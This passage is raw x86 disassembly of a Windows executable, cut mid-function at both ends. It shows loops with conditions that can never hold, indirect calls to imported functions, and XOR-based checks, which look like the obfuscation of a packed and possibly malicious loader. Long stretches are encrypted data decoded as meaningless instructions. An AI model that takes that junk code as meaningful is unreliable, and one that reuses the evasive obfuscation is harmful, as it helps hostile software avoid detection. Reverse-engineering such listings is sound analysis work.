  401892:	mov    DWORD PTR ds:0x4304e3,esi
  401898:	cmp    DWORD PTR ds:0x4304e3,0x1b
  40189f:	jae    0x4018dc
  4018a5:	cmp    DWORD PTR ds:0x4304e3,0x8
  4018ac:	jne    0x4018bd
  4018b2:	push   0x780b
  4018b7:	call   DWORD PTR ds:0x42e9ab
  4018bd:	cmp    DWORD PTR ds:0x4304e3,0x7
  4018c4:	jne    0x4018d7
  4018ca:	mov    esi,DWORD PTR ds:0x4304e3
  4018d0:	inc    esi
  4018d1:	mov    DWORD PTR ds:0x4304e3,esi
  4018d7:	jmp    0x401889
  4018dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4018df:	add    esi,DWORD PTR ds:0x42edd7
  4018e5:	mov    DWORD PTR [ecx],eax
  4018e7:	and    DWORD PTR ds:0x42eddb,0x0
  4018f1:	mov    esi,DWORD PTR ds:0x42eddb
  4018f7:	inc    esi
  4018f8:	mov    DWORD PTR ds:0x42eddb,esi
  4018fe:	cmp    DWORD PTR ds:0x42eddb,0xb
  401905:	jne    0x401914
  40190b:	push   DWORD PTR [ebp-0x1c]
  40190e:	call   DWORD PTR ds:0x42ec0f
  401914:	cmp    DWORD PTR ds:0x42eddb,0xa
  40191b:	jne    0x40192e
  401921:	mov    esi,DWORD PTR ds:0x42eddb
  401927:	inc    esi
  401928:	mov    DWORD PTR ds:0x42eddb,esi
  40192e:	cmp    DWORD PTR ds:0x42eddb,0x17
  401935:	jb     0x4018f1
  40193b:	sbb    DWORD PTR ds:0x42edcb,0x20dd
  401945:	mov    ecx,0x7510854
  40194a:	and    DWORD PTR ds:0x4304db,0x0
  401954:	jmp    0x401966
  401959:	mov    esi,DWORD PTR ds:0x4304db
  40195f:	inc    esi
  401960:	mov    DWORD PTR ds:0x4304db,esi
  401966:	cmp    DWORD PTR ds:0x4304db,0x12
  40196d:	jae    0x4019a5
  401973:	cmp    DWORD PTR ds:0x4304db,0x22
  40197a:	jne    0x40199a
  401980:	push   0x7ffb
  401985:	push   0x8364
  40198a:	push   0x42e8b7
  40198f:	push   0x6aad
  401994:	call   DWORD PTR ds:0x42ea97
  40199a:	jmp    0x401959
  40199f:	sbb    esi,DWORD PTR ds:0x43043d
  4019a5:	mov    esi,0x32729b
  4019aa:	push   ebx
  4019ab:	and    DWORD PTR ds:0x430435,0x0
  4019b5:	xor    ebx,ebx
  4019b7:	or     ebx,DWORD PTR ds:0x430435
  4019bd:	inc    ebx
  4019be:	mov    DWORD PTR ds:0x430435,ebx
  4019c4:	cmp    DWORD PTR ds:0x430435,0x19
  4019cb:	jne    0x4019e5
  4019d1:	push   0x42e945
  4019d6:	push   DWORD PTR [ebp-0x20]
  4019d9:	push   DWORD PTR [ebp-0x10]
  4019dc:	push   DWORD PTR [ebp-0xc]
  4019df:	call   DWORD PTR ds:0x42e9bb
  4019e5:	cmp    DWORD PTR ds:0x430435,0x16
  4019ec:	jb     0x4019b5
  4019f2:	mov    ax,WORD PTR [ebp-0x24]
  4019f6:	movzx  eax,ax
  4019f9:	mov    DWORD PTR [ebp-0x38],eax
  4019fc:	mov    eax,DWORD PTR [ebp+0x8]
  4019ff:	mov    DWORD PTR [ebp-0x28],eax
  401a02:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  401a09:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  401a10:	mov    eax,0x9577
  401a15:	mov    WORD PTR [ebp-0x4],ax
  401a19:	lea    eax,[ebp-0x30]
  401a1c:	mov    DWORD PTR [ebp-0x34],eax
  401a1f:	mov    eax,DWORD PTR [ebp-0x28]
  401a22:	mov    DWORD PTR [ebp-0x2c],eax
  401a25:	lea    eax,[ebp-0x18]
  401a28:	mov    DWORD PTR [ebp-0x1c],eax
  401a2b:	mov    eax,DWORD PTR [ebp-0x1c]
  401a2e:	mov    DWORD PTR [eax],0xf89f2da9
  401a34:	mov    eax,DWORD PTR [ebp-0x14]
  401a37:	mov    ebx,DWORD PTR [ebp-0x8]
  401a3a:	xor    eax,ecx
  401a3c:	xor    ebx,ecx
  401a3e:	xor    edx,edx
  401a40:	add    eax,esi
  401a42:	add    ebx,esi
  401a44:	div    ebx
  401a46:	mov    edx,DWORD PTR [ebp-0x2c]
  401a49:	cmp    eax,DWORD PTR [edx]
  401a4b:	je     0x402095
  401a51:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401a58:	jmp    0x401c1b
  401a5d:	mov    DWORD PTR [ebp-0x5a],0xc159a499
  401a64:	popa   
  401a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a66:	ja     0x401a61
  401a68:	and    eax,0xc05e346d
  401a6d:	xchg   esi,eax
  401a6e:	js     0x401aee
  401a70:	jle    0x401a0a
  401a72:	jg     0x401af2
  401a74:	jle    0x401ab0
  401a76:	jmp    0x8986c24a
  401a7b:	xchg   edx,eax
  401a7c:	fdivp  st(2),st
  401a7e:	add    al,0x39
  401a80:	xabort 0x76
  401a83:	(bad)  
  401a84:	push   0xeda38aed
  401a89:	add    ecx,esp
  401a8b:	xchg   ebp,eax
  401a8c:	out    dx,al
  401a8d:	nop
  401a8e:	jp     0x401a27
  401a90:	jno    0x401a38
  401a92:	clc    
  401a93:	or     bl,BYTE PTR [edx+0x29]
  401a96:	popf   
  401a97:	xchg   ebp,esi
  401a99:	xchg   ebp,eax
  401a9a:	jle    0x401af9
  401a9c:	mov    eax,0xa10532bd
  401aa1:	xor    DWORD PTR [edi+0x3543fe6],esp
  401aa7:	sbb    ebx,edi
  401aa9:	imul   eax,DWORD PTR [ecx-0x59],0xcdb552c
  401ab0:	test   eax,0xa74dcbad
  401ab5:	js     0x401b15
  401ab7:	cwde   
  401ab8:	imul   eax,DWORD PTR [ebp-0x5452b253],0xbc0722df
  401ac2:	xor    DWORD PTR [edi],ebp
  401ac4:	inc    edx
  401ac5:	xchg   ebp,eax
  401ac6:	shl    BYTE PTR [ecx],0x45
  401ac9:	adc    ebx,edx
  401acb:	mov    ecx,DWORD PTR [eax-0x54c9e89d]
  401ad1:	jecxz  0x401abf
  401ad3:	nop
  401ad4:	retf   0x4bd6
  401ad7:	pop    ss
  401ad8:	pop    ds
  401ad9:	pop    ebx
  401ada:	stc    
  401adb:	mov    dh,0x1f
  401add:	cmc    
  401ade:	pop    esp
  401adf:	bound  ecx,QWORD PTR [ecx+ebx*4-0x67187f48]
  401ae6:	retf   
  401ae7:	cli    
  401ae8:	mov    WORD PTR [edx+esi*2+0x7c],gs
  401aec:	popa   
  401aed:	and    eax,esp
  401aef:	loope  0x401acc
  401af1:	inc    esi
  401af2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401af3:	int    0x75
  401af5:	ror    DWORD PTR [ecx],0x65
  401af8:	(bad)  
  401af9:	jnp    0x401b46
  401afb:	ret    0x3805
  401afe:	ror    BYTE PTR [edx-0x559c191],0x27
  401b05:	cmp    ah,0x29
  401b08:	dec    eax
  401b09:	mov    bl,0x41
  401b0b:	(bad)  
  401b0c:	(bad)  
  401b0d:	jmp    0xc6ca:0x66ada32c
  401b14:	dec    esi
  401b15:	shl    DWORD PTR [edi+0x21],0x20
  401b19:	push   0x61
  401b1b:	xor    cl,0x85
  401b1e:	sub    al,0x5c
  401b20:	ins    BYTE PTR es:[edi],dx
  401b21:	mov    bh,0x84
  401b23:	aam    0x75
  401b25:	add    bh,BYTE PTR [edx-0x22]
  401b28:	mov    fs,WORD PTR [edi]
  401b2a:	stc    
  401b2b:	mov    al,0xdd
  401b2d:	jae    0x401b7f
  401b2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b30:	in     eax,dx
  401b31:	cmp    BYTE PTR [edx+ebp*2+0xd4ddff5],0x11
  401b39:	test   al,0xb8
  401b3b:	call   0xb6c1:0xc8f1ea0b
  401b42:	ins    DWORD PTR es:[edi],dx
  401b43:	aad    0xf0
  401b45:	out    dx,al
  401b46:	popa   
  401b47:	sbb    BYTE PTR [edi+eax*2-0x67],cl
  401b4b:	push   esi
  401b4c:	fs xchg edi,eax
  401b4e:	outs   dx,BYTE PTR ds:[esi]
  401b4f:	dec    eax
  401b50:	sub    al,0xf1
  401b52:	mov    esp,0x9587f758
  401b57:	call   0x6c6d:0xb369d9d6
  401b5e:	jg     0x401b07
  401b60:	cwde   
  401b61:	sbb    eax,0x4b45cbef
  401b66:	out    dx,al
  401b67:	psllw  mm6,QWORD PTR [edx+0x63]
  401b6b:	mov    eax,0x4e8f07b7
  401b70:	push   eax
  401b71:	nop
  401b72:	fcomi  st,st(7)
  401b74:	jl     0x401bf3
  401b76:	add    ecx,0x2969c875
  401b7c:	cmp    al,0xfc
  401b7e:	test   BYTE PTR [ecx],dl
  401b80:	mov    cl,0xf6
  401b82:	sub    ah,0x83
  401b85:	test   BYTE PTR [ecx+eax*8-0x45115495],ch
  401b8c:	inc    edx
  401b8d:	xchg   esp,eax
  401b8e:	push   ebp
  401b8f:	xchg   ah,al
  401b91:	mov    bh,0xa8
  401b93:	es adc eax,0x6fb0876d
  401b99:	sub    eax,0x6b72d9b6
  401b9e:	mov    esp,0x755d249f
  401ba3:	aam    0x46
  401ba5:	sub    al,0x85
  401ba7:	sbb    eax,0x94ca955b
  401bac:	push   edx
  401bad:	inc    eax
  401bae:	pop    esp
  401baf:	jnp    0x401b49
  401bb1:	arpl   WORD PTR [esi-0xb],bp
  401bb4:	test   al,0x72
  401bb6:	stos   DWORD PTR es:[edi],eax
  401bb7:	test   DWORD PTR [edx+edx*2],ebx
  401bba:	push   es
  401bbb:	popf   
  401bbc:	mov    al,0x9c
  401bbe:	jo     0x401bc8
  401bc0:	leave  
  401bc1:	fisub  WORD PTR [edx]
  401bc3:	test   eax,0x148855aa
  401bc8:	rcl    BYTE PTR [ebx+0x79],1
  401bcb:	loopne 0x401c2d
  401bcd:	and    BYTE PTR [ebp+0x22],0xa
  401bd1:	mov    edx,0x32a797da
  401bd6:	jl     0x401c0b
  401bd8:	jns    0x401b96
  401bda:	ins    DWORD PTR es:[edi],dx
  401bdb:	cmp    ebx,DWORD PTR [edi+0x9]
  401bde:	imul   edi,DWORD PTR [ebp+ecx*4-0x1a],0x30aa47e
  401be6:	in     eax,0x80
  401be8:	outs   dx,DWORD PTR ds:[esi]
  401be9:	rcl    DWORD PTR [esi-0x66],cl
  401bec:	(bad)  
  401bed:	ds jmp 0x5c56:0x77d7dbef
  401bf5:	inc    eax
  401bf6:	jecxz  0x401c59
  401bf8:	mov    WORD PTR [ebx-0x5f],ss
  401bfb:	ss hlt 
  401bfd:	fimul  WORD PTR [esi-0x2a0a5f17]
  401c03:	jmp    0xb50b4149
  401c08:	adc    al,bh
  401c0a:	or     edx,ecx
  401c0c:	xor    ah,BYTE PTR [edx-0x24]
  401c0f:	retf   
  401c10:	inc    ebp
  401c11:	es push cs
  401c13:	xchg   esp,eax
  401c14:	lds    eax,FWORD PTR ds:0xd88bfbad
  401c1a:	js     0x401ba9
  401c1c:	inc    ebp
  401c1d:	hlt    
  401c1e:	mov    DWORD PTR [ebp-0x10],eax
  401c21:	mov    eax,DWORD PTR [ebp-0x10]
  401c24:	mov    edx,DWORD PTR [eax]
  401c26:	imul   edx,edx,0xf89ea9ee
  401c2c:	mov    DWORD PTR [eax],edx
  401c2e:	mov    eax,DWORD PTR [ebp-0xc]
  401c31:	cmp    eax,0x823721f2
  401c36:	je     0x401c4a
  401c3c:	mov    eax,DWORD PTR [ebp-0x1c]
  401c3f:	or     DWORD PTR [eax],0x60751c9e
  401c45:	jmp    0x4020a4
  401c4a:	mov    eax,DWORD PTR [ebp-0xc]
  401c4d:	add    eax,DWORD PTR [ebp-0x18]
  401c50:	cmp    eax,0x7ad64f9b
  401c55:	je     0x401c69
  401c5b:	mov    eax,DWORD PTR [ebp-0x10]
  401c5e:	and    DWORD PTR [eax],0x751c99
  401c64:	jmp    0x4020a4
  401c69:	mov    eax,DWORD PTR [ebp-0xc]
  401c6c:	mov    edx,DWORD PTR [ebp-0x18]
  401c6f:	or     eax,edx
  401c71:	cmp    eax,0xfabf2dfb
  401c76:	je     0x401e4d
  401c7c:	mov    eax,DWORD PTR [ebp-0x10]
  401c7f:	jmp    0x401e42
  401c84:	das    
  401c85:	adc    bh,cl
  401c87:	inc    edx
  401c88:	icebp  
  401c89:	inc    ecx
  401c8a:	mov    bl,0x71
  401c8c:	test   DWORD PTR [edx],ebx
  401c8e:	and    bl,BYTE PTR [esi]
  401c90:	add    BYTE PTR [edi+eiz*2+0x7e063030],cl
  401c97:	jle    0x401c31
  401c99:	jg     0x401d19
  401c9b:	jle    0x401d13
  401c9d:	push   0xffffffeb
  401c9f:	jg     0x401d07
  401ca1:	mov    al,0xf2
  401ca3:	push   0x48962e1
  401ca8:	outs   dx,BYTE PTR ds:[esi]
  401ca9:	mov    WORD PTR [eax],gs
  401cab:	inc    ecx
  401cac:	pop    ss
  401cad:	lods   eax,DWORD PTR ds:[esi]
  401cae:	sbb    DWORD PTR [ecx-0x609202b7],eax
  401cb4:	pop    edx
  401cb5:	int    0xa4
  401cb7:	aad    0xdf
  401cb9:	push   cs
  401cba:	inc    ebp
  401cbb:	adc    al,0x35
  401cbd:	nop
  401cbe:	(bad)  
  401cbf:	jo     0x401d20
  401cc1:	mov    cl,0x12
  401cc3:	jb     0x401ce4
  401cc5:	xchg   edx,eax
  401cc6:	sbb    edx,DWORD PTR [edx]
  401cc8:	loop   0x401cdb
  401cca:	cmc    
  401ccb:	es inc edx
  401ccd:	rcl    ebx,cl
  401ccf:	pushf  
  401cd0:	inc    edx
  401cd1:	sub    ah,cl
  401cd3:	mov    BYTE PTR [ecx+0x4f96db4a],bh
  401cd9:	pop    ss
  401cda:	add    DWORD PTR [edi],ebp
  401cdc:	(bad)  
  401cdd:	mov    ah,0x74
  401cdf:	mov    ds:0xa4a5cd35,al
  401ce4:	push   esp
  401ce5:	not    BYTE PTR [edx]
  401ce7:	sbb    DWORD PTR [edi],esp
  401ce9:	cld    
  401cea:	sub    esp,0xe83c10b5
  401cf0:	aad    0xcb
  401cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401cf3:	add    ch,BYTE PTR [eax-0x660b600f]
  401cf9:	and    edi,ecx
  401cfb:	sub    ax,0x1b38
  401cff:	adc    ch,ah
  401d01:	gs and eax,0xc5225655
  401d07:	lea    edi,[ebx-0x4366c1a9]
  401d0d:	push   esp
  401d0e:	add    dh,dh
  401d10:	int    0x2f
  401d12:	xchg   esp,eax
  401d13:	xchg   ebp,eax
  401d14:	cwde   
  401d15:	js     0x401d48
  401d17:	xcrypt-cbc (bad)
  401d18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d19:	xchg   edx,eax
  401d1a:	and    BYTE PTR [ebx+0x3460d2e1],bl
  401d20:	or     bl,BYTE PTR [esi+ebp*4+0x4cf54409]
  401d27:	jne    0x401d0f
  401d29:	jl     0x401d4d
  401d2b:	adc    DWORD PTR [eax-0x1c],edx
  401d2e:	or     DWORD PTR [eax],0xffffffc5
  401d31:	and    edi,DWORD PTR [esp+ebx*8+0xe]
  401d35:	retf   0x5286
  401d38:	xchg   esp,eax
  401d39:	mov    ch,0x19
  401d3b:	(bad)  
  401d3d:	sbb    eax,0x83028f62
  401d42:	(bad)  
  401d44:	inc    edi
  401d45:	sub    edx,DWORD PTR [esi]
  401d47:	xlat   BYTE PTR ds:[ebx]
  401d48:	test   al,0xf6
  401d4a:	mov    dh,0x71
  401d4c:	xchg   edx,eax
  401d4d:	cld    
  401d4e:	popf   
  401d4f:	in     eax,0xe4
  401d51:	test   al,0xb1
  401d53:	fisubr DWORD PTR [ebx+0x39]
  401d56:	ficom  DWORD PTR [ecx+0x26]
  401d59:	dec    ecx
  401d5a:	popf   
  401d5b:	stc    
  401d5c:	push   eax
  401d5d:	popa   
  401d5e:	mov    es,WORD PTR [edi-0x31]
  401d61:	lahf   
  401d62:	fisubr WORD PTR [esi]
  401d64:	sbb    ah,BYTE PTR [esi-0x2566245a]
  401d6a:	lods   al,BYTE PTR ds:[esi]
  401d6b:	in     al,dx
  401d6c:	out    0xc5,al
  401d6e:	add    eax,0x4ee6b5d7
  401d73:	pop    ecx
  401d74:	(bad)  
  401d75:	xchg   ebx,eax
  401d76:	test   eax,0xd6673f29
  401d7b:	mov    ds:0x1950772f,eax
  401d80:	pop    edi
  401d81:	cmp    ecx,DWORD PTR [ebp+edi*8-0x73]
  401d85:	sub    al,0xef
  401d87:	lea    esp,ds:0xf75364e7
  401d8d:	pop    es
  401d8e:	xchg   ecx,eax
  401d8f:	pop    ss
  401d90:	loopne 0x401d3c
  401d92:	repnz das 
  401d94:	sub    ebx,ecx
  401d96:	les    edi,FWORD PTR [edi+eax*2-0x2453f9ea]
  401d9d:	in     al,dx
  401d9e:	pop    ds
  401d9f:	sar    eax,0x71
  401da2:	dec    esi
  401da3:	das    
  401da4:	cmp    ecx,DWORD PTR ds:0x135b6296
  401daa:	push   ecx
  401dab:	sub    eax,0x192a2c02
  401db0:	cdq    
  401db1:	shr    BYTE PTR [esi+edx*2],0x9f
  401db5:	into   
  401db6:	adc    eax,DWORD PTR [ecx-0x401d056e]
  401dbc:	repnz dec esp
  401dbe:	imul   eax,DWORD PTR [ebp-0x47],0xbf4a8e8d
  401dc5:	push   esp
  401dc6:	jecxz  0x401de5
  401dc8:	and    edx,DWORD PTR [edx]
  401dca:	pop    ecx
  401dcb:	or     edi,edx
  401dcd:	pcmpeqd mm4,QWORD PTR [ebx]
  401dd0:	xlat   BYTE PTR ds:[ebx]
  401dd1:	pop    ebx
  401dd2:	js     0x401de0
  401dd4:	mov    bl,0xbf
  401dd6:	aas    
  401dd7:	sar    DWORD PTR [esi+0x342e6c7f],0x91
  401dde:	push   ebp
  401ddf:	xchg   esi,eax
  401de0:	and    eax,DWORD PTR cs:[ebx-0x7d]
  401de4:	jge    0x401e12
  401de6:	add    edx,DWORD PTR [ebp+0x1d]
  401de9:	inc    di
  401deb:	and    BYTE PTR [edi+ebp*4+0x75],ah
  401def:	jmp    0x401d92
  401df1:	sub    esp,eax
  401df3:	retf   0xe30f
  401df6:	jno    0x401dd5
  401df8:	fnstenv [eiz*8+0x943b510]
  401dff:	pop    esi
  401e00:	pushfw 
  401e02:	mov    dh,0xcd
  401e04:	jmp    0x401df3
  401e06:	sub    DWORD PTR [eax+0x6b],esi
  401e09:	sub    dl,BYTE PTR [edx+ebx*1-0x46a81800]
  401e10:	push   ds
  401e11:	addr16 jl 0x401e0b
  401e14:	adc    al,0xe6
  401e16:	sub    al,0x13
  401e18:	inc    edi
  401e19:	or     BYTE PTR [eax-0x7df35ce0],ch
  401e1f:	push   ss
  401e20:	test   BYTE PTR [ecx+esi*4-0x7220c220],0x2d
  401e28:	lea    ecx,[esp+eax*1]
  401e2b:	jg     0x401e61
  401e2d:	out    dx,al
  401e2e:	xchg   BYTE PTR [ecx+ebx*8],bl
  401e31:	test   DWORD PTR [edx],eax
  401e33:	lods   eax,DWORD PTR ds:[esi]
  401e34:	jle    0x401ea7
  401e36:	scas   al,BYTE PTR es:[edi]
  401e37:	push   ss
  401e38:	jbe    0x401dec
  401e3a:	inc    ecx
  401e3b:	cld    
  401e3c:	mov    ebp,DWORD PTR [esi+0x1c]
  401e3f:	pop    esi
  401e40:	in     al,0x15
  401e42:	xor    DWORD PTR [eax],0x2650fa8f
  401e48:	jmp    0x4020a4
  401e4d:	mov    ax,WORD PTR [ebp-0x4]
  401e51:	mov    edx,0x8a3c
  401e56:	xor    ax,dx
  401e59:	mov    edx,DWORD PTR [ebp-0x28]
  401e5c:	mov    edx,DWORD PTR [edx]
  401e5e:	add    ax,di
  401e61:	cmp    ax,WORD PTR [edx]
  401e64:	je     0x402074
  401e6a:	mov    eax,DWORD PTR [ebp-0x14]
  401e6d:	xor    eax,ecx
  401e6f:	jmp    0x402032
  401e74:	mov    ebp,0xd91a1ffb
  401e79:	call   0xdfe:0x67459b9
  401e80:	jae    0x401ed6
  401e82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e83:	rcr    DWORD PTR [edx+0x7],cl
  401e86:	jle    0x401f06
  401e88:	cwde   
  401e89:	jg     0x401f09
  401e8b:	jle    0x401e26
  401e8d:	mov    ah,0x69
  401e8f:	push   edi
  401e90:	mov    bl,BYTE PTR [ebp-0x6c8ae2cb]
  401e96:	retf   0x794d
  401e99:	xchg   ecx,eax
  401e9a:	jge    0x401ea4
  401e9c:	retf   0xe6a3
  401e9f:	mov    ss,WORD PTR [ebx+0x25]
  401ea2:	clc    
  401ea3:	sub    ah,BYTE PTR ds:0x1514d88d
  401ea9:	mov    bl,0xc2
  401eab:	stos   BYTE PTR es:[edi],al
  401eac:	imul   eax,DWORD PTR [ebx-0x2f2994f6],0xc185ccf3
  401eb6:	mov    gs,WORD PTR [esi+ebx*2]
  401eb9:	mov    ebx,0xcca28dcd
  401ebe:	xor    al,0xb1
  401ec0:	jae    0x401e97
  401ec2:	shl    BYTE PTR [esi],0x4d
  401ec5:	adc    eax,0x2a4ff05f
  401eca:	repz mov ah,0x4d
  401ecd:	scas   al,BYTE PTR es:[edi]
  401ece:	push   esp
  401ecf:	mov    WORD PTR [ecx],es
  401ed1:	dec    ebx
  401ed2:	jno    0x401eba
  401ed4:	sub    eax,0x3cf6c0d
  401ed9:	dec    ecx
  401eda:	mov    ebp,0x469b6e4e
  401edf:	jo     0x401f5c
  401ee1:	dec    ebp
  401ee2:	mov    ecx,0x654ff177
  401ee7:	dec    edx
  401ee8:	adc    ah,BYTE PTR [ebp+eax*1+0x34]
  401eec:	push   ds
  401eed:	add    DWORD PTR [ebx-0x7d],eax
  401ef0:	push   DWORD PTR [edx-0x2d]
  401ef3:	jo     0x401f29
  401ef5:	lea    edx,[edi-0x4851932b]
  401efb:	ret    
  401efc:	loopne 0x401eaf
  401efe:	psllw  mm5,QWORD PTR [edi-0x10]
  401f02:	and    eax,0xaac1cec9
  401f07:	jae    0x401f34
  401f09:	cdq    
  401f0a:	daa    
  401f0b:	mov    ebp,DWORD PTR [esi-0x46]
  401f0e:	outs   dx,BYTE PTR ds:[esi]
  401f0f:	rcl    DWORD PTR [edx-0x34c5a110],cl
  401f15:	fsub   QWORD PTR [edx-0x47]
  401f18:	and    eax,0x2fe68d14
  401f1d:	mov    WORD PTR [ebx],es
  401f1f:	xchg   edi,eax
  401f20:	push   ebx
  401f21:	push   edx
  401f22:	mov    esi,edx
  401f24:	xlat   BYTE PTR ds:[ebx]
  401f25:	dec    esi
  401f26:	in     eax,0xc6
  401f28:	fwait
  401f29:	cmp    eax,0x14841036
  401f2e:	leave  
  401f2f:	imul   esi,DWORD PTR [edx],0x22
  401f32:	ins    BYTE PTR es:[edi],dx
  401f33:	ds out dx,al
  401f35:	lods   eax,DWORD PTR ds:[esi]
  401f36:	adc    ah,al
  401f38:	(bad)  
  401f3a:	cdq    
  401f3b:	sbb    eax,0x258dc25b
  401f40:	sbb    esp,DWORD PTR [edx-0x61]
  401f43:	ret    0x4c38
  401f46:	js     0x401f57
  401f48:	into   
  401f49:	push   ss
  401f4a:	and    eax,DWORD PTR [esi]
  401f4c:	ja     0x401f24
  401f4e:	jg     0x401f99
  401f50:	outs   dx,DWORD PTR ds:[esi]
  401f51:	call   0x555b:0x4325355b
  401f58:	cwde   
  401f59:	sub    DWORD PTR [eax-0x13],ebp
  401f5c:	add    BYTE PTR [ebx+0x49],ch
  401f5f:	ss xchg esp,eax
  401f61:	pop    ebx
  401f62:	adc    BYTE PTR [ebx+ecx*1+0xc],bh
  401f66:	std    
  401f67:	mov    DWORD PTR [edx-0x459025e7],edi
  401f6d:	sub    dh,BYTE PTR [ecx+0x6201abd8]
  401f73:	cmp    al,0x39
  401f75:	sub    DWORD PTR [ebx+0x3d59b148],ebx
  401f7b:	rol    DWORD PTR [edx+0x36064de],cl
  401f81:	sub    BYTE PTR [edi-0x1d61030b],dh
  401f87:	and    eax,DWORD PTR [edi+0x7e1dc63e]
  401f8d:	bound  edi,QWORD PTR [ecx-0x21df33dd]
  401f93:	int3   
  401f94:	xor    BYTE PTR [ecx-0x6f58ac0f],cl
  401f9a:	jmp    0xa77d:0xcf5c59d8
  401fa1:	xlat   BYTE PTR ds:[ebx]
  401fa2:	jno    0x40201c
  401fa4:	add    dl,BYTE PTR [edx-0x72]
  401fa7:	int3   
  401fa8:	mov    al,0x82
  401faa:	inc    eax
  401fab:	push   ds
  401fac:	push   es
  401fad:	dec    ebp
  401fae:	inc    edi
  401faf:	jecxz  0x402013
  401fb1:	in     eax,0xd0
  401fb3:	and    ebx,ebx
  401fb5:	scas   al,BYTE PTR es:[edi]
  401fb6:	stos   BYTE PTR es:[edi],al
  401fb7:	(bad)  
  401fb8:	sbb    BYTE PTR [ebp+0x3a3989a8],ah
  401fbe:	inc    ecx
  401fbf:	out    0x76,al
  401fc1:	push   0xcd1d7cef
  401fc6:	es adc ch,dl
  401fc9:	adc    al,0x85
  401fcb:	and    ebx,ebx
  401fcd:	shl    DWORD PTR [edi-0x23],cl
  401fd0:	push   ebx
  401fd1:	fdivr  QWORD PTR [edi+0x127f5022]
  401fd7:	jecxz  0x40202b
  401fd9:	jb     0x401f7f
  401fdb:	push   es
  401fdc:	inc    ecx
  401fdd:	mov    cl,0xde
  401fdf:	nop
  401fe0:	add    dh,al
  401fe2:	cmovnp esp,edx
  401fe5:	inc    esi
  401fe6:	add    DWORD PTR [eax+eiz*2],eax
  401fe9:	lock sbb DWORD PTR [ecx],eax
  401fec:	mov    bh,BYTE PTR [edx+0xc]
  401fef:	fld    DWORD PTR [edx+0x33553a61]
  401ff5:	xor    DWORD PTR [edx],0xb490a615
  401ffb:	jae    0x401fbd
  401ffd:	push   ecx
  401ffe:	mov    edx,0x90d47e33
  402003:	and    edx,DWORD PTR [ecx+0x54]
  402006:	inc    edx
  402007:	mov    ebx,?
  402009:	xlat   BYTE PTR ds:[ebx]
  40200a:	mov    edi,0x11ea095d
  40200f:	cmp    esi,ebx
  402011:	or     ebx,edx
  402013:	inc    esp
  402014:	xor    ch,bh
  402016:	mov    edi,0x54a648a9
  40201b:	nop
  40201c:	sbb    ch,BYTE PTR [eax+ecx*4+0x7d084eb8]
  402023:	mov    al,ds:0xfdedaa27
  402028:	mov    dl,0x4e
  40202a:	mov    bh,0xf2
  40202c:	adc    ebx,ecx
  40202e:	ret    0xcfa5
  402031:	inc    DWORD PTR [ebx]
  402033:	(bad)  
  402034:	mov    DWORD PTR [ebp-0x30],eax
  402037:	mov    eax,DWORD PTR [ebp-0x34]
  40203a:	mov    dx,WORD PTR [ebp-0x38]
  40203e:	mov    ebx,0x8a3c
  402043:	xor    dx,bx
  402046:	mov    ebx,DWORD PTR [ebp-0x8]
  402049:	add    dx,di
  40204c:	movzx  edx,dx
  40204f:	xor    ebx,ecx
  402051:	lea    edx,[edx+ebx*1+0x32729b]
  402058:	add    DWORD PTR [eax],edx
  40205a:	mov    eax,DWORD PTR [ebp-0x2c]
  40205d:	mov    edx,DWORD PTR [ebp-0x8]
  402060:	mov    ebx,DWORD PTR [ebp-0x30]
  402063:	xor    edx,ecx
  402065:	add    edx,esi
  402067:	imul   edx,ebx
  40206a:	sub    DWORD PTR [eax],edx
  40206c:	mov    eax,DWORD PTR [ebp-0x14]
  40206f:	jmp    0x4020a7
  402074:	mov    eax,DWORD PTR [ebp-0xc]
  402077:	mov    edx,DWORD PTR [ebp-0x18]
  40207a:	xor    eax,edx
  40207c:	cmp    eax,0x7aa80c5b
  402081:	je     0x4020a4
  402087:	mov    eax,DWORD PTR [ebp-0x10]
  40208a:	add    DWORD PTR [eax],0x7403501
  402090:	jmp    0x4020a4
  402095:	mov    eax,DWORD PTR [ebp-0x1c]
  402098:	cmp    DWORD PTR [eax],0xf89f2da9
  40209e:	jne    0x4020bf
  4020a4:	mov    eax,DWORD PTR [ebp-0x8]
  4020a7:	xor    eax,ecx
  4020a9:	add    eax,esi
  4020ab:	test   eax,eax
  4020ad:	jne    0x4020bf
  4020b3:	xor    DWORD PTR [ebp-0x20],0xe149eb8
  4020ba:	jmp    0x4019ab
  4020bf:	pop    ebx
  4020c0:	pop    edi
  4020c1:	pop    esi
  4020c2:	leave  
  4020c3:	ret    0x4
  4020c6:	push   ebp
  4020c7:	mov    ebp,esp
  4020c9:	sub    esp,0x28
  4020cc:	leave  
  4020cd:	ret    0x10
  4020d0:	push   ebp
  4020d1:	mov    ebp,esp
  4020d3:	jmp    0x4022cb
  4020d8:	outs   dx,BYTE PTR ds:[esi]
  4020d9:	jecxz  0x402113
  4020db:	mov    ecx,0xf16f6151
  4020e0:	jne    0x402154
  4020e2:	add    al,0xd
  4020e4:	push   0x84111d4c
  4020e9:	add    eax,0x7f557e7e
  4020ee:	jle    0x40216e
  4020f0:	pop    ss
  4020f1:	fadd   DWORD PTR [ecx]
  4020f3:	sahf   
  4020f4:	dec    ebx
  4020f5:	jg     0x40213f
  4020f7:	push   ecx
  4020f8:	push   esp
  4020f9:	retf   0xbc4
  4020fc:	fcmovnb st,st(0)
  4020fe:	mov    BYTE PTR [esi+0x32],dh
  402101:	in     al,0x9e
  402103:	mov    esi,0xb841a4c7
  402108:	(bad)  
  402109:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40210a:	pushf  
  40210b:	out    dx,al
  40210c:	push   0x4a017177
  402111:	scas   eax,DWORD PTR es:[edi]
  402112:	jp     0x40215e
  402114:	je     0x4020ff
  402116:	sbb    ecx,edx
  402118:	ret    
  402119:	js     0x4020e9
  40211b:	jae    0x402185
  40211d:	add    BYTE PTR [eax-0xe],dh
  402120:	loope  0x4020e4
  402122:	dec    edx
  402123:	xlat   BYTE PTR ds:[ebx]
  402124:	sub    ch,BYTE PTR [ebx]
